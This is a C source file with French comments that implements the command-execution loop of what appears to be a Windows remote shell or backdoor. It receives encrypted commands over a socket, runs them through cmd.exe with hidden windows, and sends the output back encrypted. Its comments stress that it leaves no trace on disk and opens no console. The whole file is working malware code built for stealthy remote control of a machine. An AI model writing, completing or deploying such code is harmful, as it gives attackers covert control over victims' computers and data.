/*
 * shell.c — Exécution de commandes et boucle shell
 */

/* winsock2.h doit précéder windows.h */
#include <winsock2.h>
#include <windows.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "crypto.h"
#include "shell.h"

/* ================================================================
 * Exécution de commande via pipe anonyme
 *
 * Avantages vs fichier temporaire :
 *   - Pas de trace sur disque
 *   - Pas de problème de droits d'écriture
 *   - Plus rapide
 * ================================================================ */

char *exec_cmd(const char *cmd)
{
    char *out = (char *)malloc(65536);
    if (!out)
        return NULL;
    out[0] = 0;

    /* Pipe : write-end → stdout/stderr du fils, read-end → nous */
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hRead, hWrite;

    if (!CreatePipe(&hRead, &hWrite, &sa, 65536)) {
        strcpy(out, "[pipe_err]\r\n");
        return out;
    }
    /* Le read-end ne doit pas être hérité par le fils */
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    /* NUL pour stdin — pas de console avec -mwindows */
    HANDLE hNul = CreateFileA("NUL", GENERIC_READ,
                              FILE_SHARE_READ | FILE_SHARE_WRITE,
                              &sa, OPEN_EXISTING, 0, NULL);

    /* Chemin absolu vers cmd.exe pour éviter les problèmes de PATH */
    char sysdir[MAX_PATH];
    char cmdline[8192];
    GetSystemDirectoryA(sysdir, MAX_PATH);
    snprintf(cmdline, sizeof(cmdline), "%s\\cmd.exe /C %s", sysdir, cmd);

    STARTUPINFOA si = { 0 };
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput   = (hNul != INVALID_HANDLE_VALUE) ? hNul : NULL;
    si.hStdOutput  = hWrite;
    si.hStdError   = hWrite;

    PROCESS_INFORMATION pi = { 0 };
    BOOL ok = CreateProcessA(NULL, cmdline, NULL, NULL,
                             TRUE, CREATE_NO_WINDOW,
                             NULL, NULL, &si, &pi);

    /* Fermer le write-end côté parent pour que ReadFile se termine */
    CloseHandle(hWrite);
    if (hNul != INVALID_HANDLE_VALUE)
        CloseHandle(hNul);

    if (!ok) {
        CloseHandle(hRead);
        snprintf(out, 64, "[exec_err %lu]\r\n", GetLastError());
        return out;
    }

    DWORD total = 0, rd;
    char  tmp[4096];

    while (ReadFile(hRead, tmp, sizeof(tmp), &rd, NULL) && rd > 0) {
        if (total + rd > 65533)
            break;
        memcpy(out + total, tmp, rd);
        total += rd;
    }
    out[total] = 0;

    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);

    if (total == 0)
        strcpy(out, "[no output]\r\n");

    return out;
}

/* ================================================================
 * Boucle principale du shell
 * ================================================================ */

void shell_loop(SOCKET sock)
{
    while (1) {
        int      cmd_len = 0;
        uint8_t *raw     = recv_dec(sock, &cmd_len);

        if (!raw)
            break;

        /* Copie dans un buffer C-string et suppression des \r\n finaux */
        char cmd[4096] = { 0 };
        int  len       = (cmd_len < 4095) ? cmd_len : 4095;
        memcpy(cmd, raw, len);
        free(raw);

        while (len > 0 && (cmd[len - 1] == '\r' || cmd[len - 1] == '\n'))
            cmd[--len] = 0;

        /* Commande vide : renvoyer une ligne vide */
        if (len == 0) {
            send_enc(sock, (uint8_t *)"\r\n", 2);
            continue;
        }

        char *out = exec_cmd(cmd);
        if (out) {
            send_enc(sock, (uint8_t *)out, (int)strlen(out));
            free(out);
        } else {
            send_enc(sock, (uint8_t *)"[error]\r\n", 9);
        }
    }
}
